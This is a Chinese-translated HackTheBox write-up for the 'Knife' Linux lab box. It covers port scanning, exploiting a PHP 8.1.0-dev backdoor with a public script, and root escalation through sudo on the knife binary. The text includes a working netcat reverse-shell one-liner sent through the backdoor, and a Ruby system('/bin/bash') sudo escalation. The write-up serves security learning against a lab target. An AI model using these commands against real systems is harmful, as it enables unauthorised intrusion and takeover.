<html>
<head>
<title>HackTheBox Writeup: Knife</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑客盒子报道:刀</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hackthebox-writeup-knife-2a3dd526d11d?source=collection_archive---------0-----------------------#2021-08-28">https://infosecwriteups.com/hackthebox-writeup-knife-2a3dd526d11d?source=collection_archive---------0-----------------------#2021-08-28</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/157113ddea14c6db27eccf646753044e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1196/format:webp/1*0vT7EgwDHCwgM-mf8TjMnA.png"/></div></figure><p id="5e86" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这是一个由易到难的Linux盒子，要求攻击者仔细列举一个网站以获得立足点，并利用二进制文件将权限提升到root。</p><h1 id="88b9" class="ks kt iq bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp bi translated">列举</h1><p id="a68d" class="pw-post-body-paragraph ju jv iq jw b jx lq jz ka kb lr kd ke kf ls kh ki kj lt kl km kn lu kp kq kr ij bi translated">我开始通过用<strong class="jw ir"> NMAP </strong>执行快速扫描来枚举目标机器，以识别任何打开的端口:</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="e4aa" class="me kt iq ma b gy mf mg l mh mi">nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report 10.10.10.242</span><span id="22c6" class="me kt iq ma b gy mj mg l mh mi">PORT   STATE SERVICE REASON<br/>22/tcp open  ssh     syn-ack ttl 63<br/>80/tcp open  http    syn-ack ttl 63</span></pre><p id="1d8a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">扫描发现三个端口打开(即端口22和80)。接下来，我使用NMAP来识别每个端口上运行的服务，并使用通用NSE脚本来查找我可以利用的任何常见漏洞:</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="100f" class="me kt iq ma b gy mf mg l mh mi">nmap -sV -sC -Pn -v -p 22,80 -oN nmap-report 10.10.10.242</span><span id="5e0d" class="me kt iq ma b gy mj mg l mh mi">PORT   STATE SERVICE VERSION<br/>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)<br/>80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))<br/>| http-methods: <br/>|_  Supported Methods: GET HEAD POST OPTIONS<br/>|_http-server-header: Apache/2.4.41 (Ubuntu)<br/>|_http-title:  Emergent Medical Idea<br/>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></pre><p id="f3f5" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我可以看到一个网站被托管在端口80上，所以我决定移动并检查该网站。</p><h1 id="fe2b" class="ks kt iq bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp bi translated">HTTP —端口80分析</h1><p id="6c9e" class="pw-post-body-paragraph ju jv iq jw b jx lq jz ka kb lr kd ke kf ls kh ki kj lt kl km kn lu kp kq kr ij bi translated">导航到托管在端口80上的网站，我看到了以下网页。</p><figure class="lv lw lx ly gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ml mm di mn bf mo"><div class="gh gi mk"><img src="../Images/fbef68015c9079b3891e20a0a0eb24d0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MKbyZWOcg56WHUWlWcfAjg.png"/></div></div><figcaption class="mp mq gj gh gi mr ms bd b be z dk translated">托管在端口80上的网站</figcaption></figure><p id="7f33" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我花了一些时间来列举网站和模糊任何隐藏的目录或文件，但我没有看到任何感兴趣的东西。我继续使用BurpSuite来拦截网络请求，并在服务器的响应中看到了一个有趣的标题:</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="ac27" class="me kt iq ma b gy mf mg l mh mi">HTTP/1.1 200 OK<br/>Date: Wed, 09 Jun 2021 19:01:03 GMT<br/>Server: Apache/2.4.41 (Ubuntu)<br/>X-Powered-By: PHP/8.1.0-dev     # Interesting!<br/>Vary: Accept-Encoding<br/>Content-Length: 5815<br/>Connection: close<br/>Content-Type: text/html; charset=UTF-8</span></pre><p id="c5da" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我可以看到应用程序通过非标准的<strong class="jw ir"> X-Powered-By </strong>头公开信息。标题称该网站由<strong class="jw ir"> PHP/8.1.0-dev </strong>提供支持。</p><blockquote class="mt mu mv"><p id="0383" class="ju jv mw jw b jx jy jz ka kb kc kd ke mx kg kh ki my kk kl km mz ko kp kq kr ij bi translated"><strong class="jw ir"> X-Powered-By </strong>是一个常见的非标准HTTP响应头(大多数以‘X-’为前缀的头是非标准的)。默认情况下，它通常包含在通过特定脚本技术构建的响应中。值得注意的是，它可以被服务器禁用和/或操纵。一些服务器选择不包含它，甚至提供误导性信息来摆脱可能针对特定技术/版本的黑客。</p></blockquote><p id="5b5b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在谷歌上快速搜索<strong class="jw ir"> PHP/8.1.0-dev </strong>后，我<strong class="jw ir"> </strong>发现了一个后门远程命令注入python漏洞脚本:</p><div class="na nb gp gr nc nd"><a href="https://packetstormsecurity.com/files/162749/php_8.1.0-dev.py.txt" rel="noopener  ugc nofollow" target="_blank"><div class="ne ab fo"><div class="nf ab ng cl cj nh"><h2 class="bd ir gy z fp ni fr fs nj fu fw ip bi translated">PHP 8 . 1 . 0-开发后门远程命令注入</h2><div class="nk l"><h3 class="bd b gy z fp ni fr fs nj fu fw dk translated">PHP 8 . 1 . 0-开发后门远程命令注入作者理查德·琼斯PHP版本8 . 1 . 0-开发后门…</h3></div><div class="nl l"><p class="bd b dl z fp ni fr fs nj fu fw dk translated">packetstormsecurity.com</p></div></div></div></a></div><p id="7c3f" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我下载了漏洞并如下运行，这很有效！</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="0e12" class="me kt iq ma b gy mf mg l mh mi">$ python3 backdoor.py -u <a class="ae nm" href="http://10.10.10.242/" rel="noopener ugc nofollow" target="_blank">http://10.10.10.242/</a> -c ls<br/>[+] Results:<br/>bin<br/>boot<br/>cdrom<br/>dev<br/>etc<br/>...etc...</span></pre><p id="09ca" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">接下来，我使用漏洞脚本在目标机器上创建一个反向shell:</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="f3dd" class="me kt iq ma b gy mf mg l mh mi"># kali machine listener<br/>nc -lvnp 4444</span><span id="ff2b" class="me kt iq ma b gy mj mg l mh mi">python3 backdoor.py -u <a class="ae nm" href="http://10.10.10.242/" rel="noopener ugc nofollow" target="_blank">http://10.10.10.242/</a> -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; 4444 &gt;/tmp/f"</span><span id="024b" class="me kt iq ma b gy mj mg l mh mi"># stabilize shell<br/>python3 -c 'import pty; pty.spawn("/bin/bash")'</span><span id="6a8d" class="me kt iq ma b gy mj mg l mh mi">james@knife:/$</span></pre><p id="45b1" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我可以看到我以用户James的身份登录，并且能够检索用户标志:</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="8280" class="me kt iq ma b gy mf mg l mh mi">james@knife:~$ cat user.txt</span><span id="24ac" class="me kt iq ma b gy mj mg l mh mi">8cd2efcec990......</span></pre><h1 id="cc20" class="ks kt iq bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp bi translated">权限提升</h1><p id="e258" class="pw-post-body-paragraph ju jv iq jw b jx lq jz ka kb lr kd ke kf ls kh ki kj lt kl km kn lu kp kq kr ij bi translated">我可以看到在James home目录中有一个有趣的文件叫做<strong class="jw ir"> shell.rb </strong>，它包含以下代码:</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="3211" class="me kt iq ma b gy mf mg l mh mi">system(‘/bin/bash’)</span></pre><p id="48d3" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我开始寻找将我的权限提升到root的方法，并发现用户James可以使用sudo作为root运行一个名为<strong class="jw ir"> knife </strong>的二进制文件:</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="b4cc" class="me kt iq ma b gy mf mg l mh mi">$ sudo -l</span><span id="1237" class="me kt iq ma b gy mj mg l mh mi">User james may run the following commands on knife:<br/>    (root) NOPASSWD: /usr/bin/knife</span></pre><p id="3844" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我决定检查<strong class="jw ir">刀</strong>的命令选项，我可以看到有一个使用二进制文件执行文件的选项:</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="9ebf" class="me kt iq ma b gy mf mg l mh mi">$ sudo knife help</span><span id="be37" class="me kt iq ma b gy mj mg l mh mi">** EXEC COMMANDS **<br/>knife exec [SCRIPT] (options)</span></pre><p id="2be6" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我用sudo作为root运行这个命令，并使用shell.rb文件获得一个具有root权限的新shell。然后，我检索了根标志:</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="54a7" class="me kt iq ma b gy mf mg l mh mi">james@knife:~$ sudo knife exec shell.rb</span><span id="aa28" class="me kt iq ma b gy mj mg l mh mi">root@knife:/home/james# cat /root/root.txt</span><span id="8f78" class="me kt iq ma b gy mj mg l mh mi">b77e375181e32f.........</span></pre><h1 id="6ebf" class="ks kt iq bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp bi translated">最后的想法</h1><p id="cf0e" class="pw-post-body-paragraph ju jv iq jw b jx lq jz ka kb lr kd ke kf ls kh ki kj lt kl km kn lu kp kq kr ij bi translated">我很高兴使用这台机器，并发现它是初学者学习重要概念的好方法，例如检查网络请求/响应头和使用自定义漏洞。谢谢你一直读到最后，祝你黑客快乐😄！</p></div></div>    
</body>
</html>